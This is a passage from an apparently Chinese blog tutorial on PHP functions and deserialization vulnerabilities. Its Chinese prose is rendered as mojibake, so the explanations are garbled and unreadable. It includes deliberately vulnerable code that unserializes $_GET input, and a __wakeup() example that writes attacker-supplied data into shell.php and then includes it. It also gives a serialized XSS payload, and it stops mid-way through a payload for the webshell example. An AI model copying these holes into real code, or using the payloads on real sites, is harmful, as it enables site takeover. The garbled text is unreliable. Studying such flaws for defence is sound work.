class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?php include 'vars.php';echo "I have a $color $car"; // I have a red BMW?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="5-rand-å‡½æ•°"><a href="#5-rand-å‡½æ•°" class="headerlink" title="5.rand()å‡½æ•°"></a>5.rand()å‡½æ•°</h2><p>rand(1,10):ä»1-10ä¹‹ä¸­éšæœºå–ä¸€ä¸ªæ•°å­—</p><h2 id="6-strpos-å‡½æ•°"><a href="#6-strpos-å‡½æ•°" class="headerlink" title="6.strpos() å‡½æ•°"></a>6.strpos() å‡½æ•°</h2><p><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-string-strpos.html</a></p><p>ç›¸å…³å‡½æ•°ï¼š</p><ul><li><a href="https://www.runoob.com/php/func-string-strripos.html" target="_blank" rel="noopener">strripos()</a> - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</li><li><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">strpos()</a> - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</li><li><a href="https://www.runoob.com/php/func-string-strrpos.html" target="_blank" rel="noopener">strrpos()</a> - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</li></ul><h2 id="7-file-get-contents-å‡½æ•°"><a href="#7-file-get-contents-å‡½æ•°" class="headerlink" title="7.file_get_contents() å‡½æ•°"></a>7.<a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html" target="_blank" rel="noopener">file_get_contents() å‡½æ•°</a></h2><pre><code>&lt;?phpecho file_get_contents(&quot;test.txt&quot;);?&gt;</code></pre><p>ä¸Šé¢çš„ä»£ç å°†è¾“å‡ºï¼š</p><p>This is a test file with test text.</p><p>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è¯»ä¸€ä¸ªæ–‡ä»¶ä¸­çš„æ–‡æœ¬</p><h1 id="PHPä¹‹åºåˆ—åŒ–"><a href="#PHPä¹‹åºåˆ—åŒ–" class="headerlink" title="PHPä¹‹åºåˆ—åŒ–"></a>PHPä¹‹åºåˆ—åŒ–</h1><h2 id="åºåˆ—åŒ–çš„å¼€å§‹phpä¸­serialize-ä¸unserialize-å‡½æ•°ä½¿ç”¨æ–¹æ³•"><a href="#åºåˆ—åŒ–çš„å¼€å§‹phpä¸­serialize-ä¸unserialize-å‡½æ•°ä½¿ç”¨æ–¹æ³•" class="headerlink" title="åºåˆ—åŒ–çš„å¼€å§‹phpä¸­serialize()ä¸unserialize()å‡½æ•°ä½¿ç”¨æ–¹æ³•"></a>åºåˆ—åŒ–çš„å¼€å§‹<a href="https://so.csdn.net/search?q=php%E4%B8%ADunserialize" target="_blank" rel="noopener">phpä¸­serialize()ä¸unserialize()å‡½æ•°ä½¿ç”¨æ–¹æ³•</a></h2><p>åºåˆ—åŒ– (Serialization)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œé‡æ–°åˆ›å»ºè¯¥å¯¹è±¡ã€‚</p><p>ç†è§£ï¼š</p><p>æ„æ€å¯èƒ½å°±æ˜¯å°†ä»£ç å˜æˆä¸€ç§å¯ä»¥è¿›è¡Œä¼ è¾“çš„ä¸€ç»„æ•°æ®æµï¼Œå°±æ˜¯ä¸€ä¸²ç®€åŒ–åçš„å­—ç¬¦ä¸²</p><p>å®æ“ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºä¸€ä¸ªpersonç±»ï¼Œåœ¨ç±»ä¸­å®šä¹‰äº†ä¸‰ä¸ªå±æ€§ï¼Œç„¶åå®ä¾‹åŒ–äº†ä¸€ä¸ªaï¼Œä½¿ç”¨serializaå°†$aè¿™ä¸ªå¯¹è±¡è¿›è¡Œäº†åºåˆ—åŒ–ï¼š</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"yyk"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Oä»£è¡¨å¯¹è±¡ å› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ åºåˆ—åŒ–æ•°ç»„åˆ™ç”¨Aæ¥è¡¨ç¤º</strong></p><p><strong>6 ä»£è¡¨ç±»åå­—personå 6ä¸ªå­—ç¬¦</strong></p><p><strong>person ç±»å</strong></p><p><strong>3 ä»£è¡¨ä¸‰ä¸ªå±æ€§</strong></p><p><strong>s ä»£è¡¨å­—ç¬¦ä¸²</strong></p><p><strong>4 ä»£è¡¨å±æ€§åé•¿åº¦</strong></p><p><strong>name å±æ€§å</strong></p><p><strong>s:3:â€yykâ€ å­—ç¬¦ä¸² å±æ€§å€¼é•¿åº¦ å±æ€§å€¼</strong></p><p>åŒæ—¶éšç€è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„æ”¹å˜ï¼Œåºåˆ—åŒ–åçš„å±æ€§é•¿åº¦å’Œå±æ€§å€¼ä¹Ÿä¼šä¸åŒï¼š</p><ul><li>public(å…¬æœ‰)</li><li>protected(å—ä¿æŠ¤)</li><li>private(ç§æœ‰çš„)</li></ul><p>ä¸¾ä¾‹ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"yyk"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"%00person%00sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"%00*%00age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>protectedå±æ€§è¢«åºåˆ—åŒ–åå±æ€§åé•¿åº¦ä¼šå¢åŠ 3ï¼Œå› ä¸ºå±æ€§åä¼šå˜æˆ%00*%00å±æ€§åã€‚</p><p>privateå±æ€§è¢«åºåˆ—åŒ–åå±æ€§åä¼šå˜æˆ%00ç±»å%00å±æ€§åã€‚</p><h3 id="é­”æœ¯æ–¹æ³•-sleep"><a href="#é­”æœ¯æ–¹æ³•-sleep" class="headerlink" title="é­”æœ¯æ–¹æ³• sleep()"></a>é­”æœ¯æ–¹æ³• <strong>sleep()</strong></h3><p>serialize()å‡½æ•°åœ¨åºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨é­”æœ¯æ–¹æ³•sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œsleep()æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åå†æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚<code>__sleep()æ–¹æ³•å¯ä»¥ç¡®å®šé‚£äº›å±æ€§è¢«åºåˆ—åŒ–ã€‚å¦‚æœæ²¡æœ‰__</code>sleep()æ–¹æ³•åˆ™é»˜è®¤åºåˆ—åŒ–æ‰€æœ‰å±æ€§ã€‚</p><p>å®æ“</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘åœ¨ç±»ä¸­æ„é€ __sleep()å‡½æ•°ï¼Œä»¥å®ç°$ageï¼Œ$sexè¢«åºåˆ—åŒ–ï¼Œè€Œ$nameæ²¡æœ‰è¢«åºåˆ—åŒ–</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"personsex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"*age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‰å¼•ï¼š</p><p><strong>unserialize()åä¼šå¯¼è‡´ <code>__wakeup()</code>æˆ– <code>__destruct()</code>çš„ç›´æ¥è°ƒç”¨ï¼Œä¸­é—´æ— éœ€å…¶ä»–è¿‡ç¨‹.</strong></p><p><strong>å› æ­¤æœ€ç†æƒ³çš„æƒ…å†µå°±æ˜¯ä¸€äº›æ¼æ´/å±å®³ä»£ç åœ¨ <code>__wakeup()</code> æˆ– <code>__destruct()</code>ä¸­ï¼Œä»è€Œå½“æˆ‘ä»¬æ§åˆ¶åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶å¯ä»¥å»ç›´æ¥è§¦å‘å®ƒä»¬ .</strong></p><h3 id="é­”æœ¯æ–¹æ³•-destruct"><a href="#é­”æœ¯æ–¹æ³•-destruct" class="headerlink" title="é­”æœ¯æ–¹æ³• __destruct()"></a>é­”æœ¯æ–¹æ³• __destruct()</h3><p>è„šæœ¬è¿è¡Œç»“æŸä¹‹å‰ä¼šè°ƒç”¨å¯¹è±¡çš„ææ„å‡½æ•°</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ urlï¼š</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"yyk"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¼šå¾—åˆ°yyk</p><p> æ¼æ´åˆ©ç”¨ï¼šæˆ‘ä»¬å¯ä»¥æ„å»ºpayloadï¼Œå°†æ¶æ„ä»£ç æ’å…¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œç„¶åå°†æ¶æ„ä»£ç è½¬æ¢æˆå¯¹è±¡ï¼Œè°ƒç”¨__destruct()æ–¹æ³•æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>payload:</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="é­”æœ¯æ–¹æ³•-wakeup"><a href="#é­”æœ¯æ–¹æ³•-wakeup" class="headerlink" title="é­”æœ¯æ–¹æ³• __wakeup()"></a>é­”æœ¯æ–¹æ³• __wakeup()</h3><p>unserialize()å‡½æ•°åœ¨åºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨é­”æœ¯æ–¹æ³•wakeup()ã€‚å¦‚æœå­˜åœ¨ï¼Œwakeup()æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åå†æ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚å¯ä»¥å†__wakeup()æ–¹æ³•ä¸­å¯¹å±æ€§è¿›è¡Œåˆå§‹åŒ–æˆ–è€…æ”¹å˜ã€‚</p><p>æ¯”å¦‚ï¼šåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å¯¹å±æ€§è¿›è¡Œé‡æ–°èµ‹å€¼ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'renew name'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨unserialize()å‡½æ•°å‘åŠ¨ä¹‹å‰ï¼Œwakeupå‡½æ•°ä¼šæå‰è§‰é†’ï¼Œå¹¶ä¸”å‘åŠ¨</p><p>æºç åˆ†æï¼šå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå°†å®ƒåºåˆ—åŒ–åè¾“å‡ºã€‚å†è¿›è¡Œååºåˆ—åŒ–ï¼Œè°ƒç”¨äº†wakeup()å‡½æ•°ï¼Œå¯¼è‡´åºåˆ—åŒ–å$nameå˜æˆäº†renew nameã€‚</p><p>è¿™äº›çœ‹èµ·æ¥ä¼¼ä¹æ˜¯æ²¡æœ‰ä»€ä¹ˆå±å®³ï¼Œä½†æ˜¯å¦‚æœwakeup()å‡½æ•°å¤„å®šä¹‰çš„ä»£ç ä¸æ˜¯é‡æ–°èµ‹å€¼ï¼Œè€Œæ˜¯æ¼æ´ä»£ç å±å®³å°±å¤§äº†ã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'zhangsan'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zhangsan</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$un</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$un</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-filesystem-fopen.html" target="_blank" rel="noopener">PHP fopen() å‡½æ•°</a>ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æˆ– URLã€‚</p><p><a href="https://www.runoob.com/php/func-filesystem-fwrite.html" target="_blank" rel="noopener">PHP fwrite() å‡½æ•°</a>ï¼šå°†å†…å®¹å†™å…¥ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ä¸­ã€‚</p><p><a href="https://www.runoob.com/php/func-filesystem-fclose.html" target="_blank" rel="noopener">PHP fclose() å‡½æ•°</a>ï¼šé—­æ‰“å¼€çš„æ–‡ä»¶ã€‚</p><p>è¿™é‡Œçš„æ„æ€å°±æ˜¯å°†shell.phpä»¥å†™çš„å½¢å¼æ‰“å¼€ï¼Œç„¶åå†™å…¥åˆ°nameçš„å€¼å½“ä¸­ï¼Œåˆå› ä¸ºæ˜¯__wakeupå‡½æ•°ï¼Œæ‰€ä»¥ä¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰è¢«æ‰§è¡Œå‡ºæ¥</p><p>æºç åˆ†æï¼ˆä½¿ç”¨æ–¹æ³•ï¼‰ï¼šunserialize()ååºåˆ—åŒ–ä¹‹åä¼šè°ƒç”¨wakeup()å‡½æ•°ï¼Œå°†å¯¹è±¡å±æ€§nameçš„å€¼å†™å…¥shell.phpæ–‡ä»¶å½“ä¸­ï¼Œç„¶åå»åŒ…å«å®ƒã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token 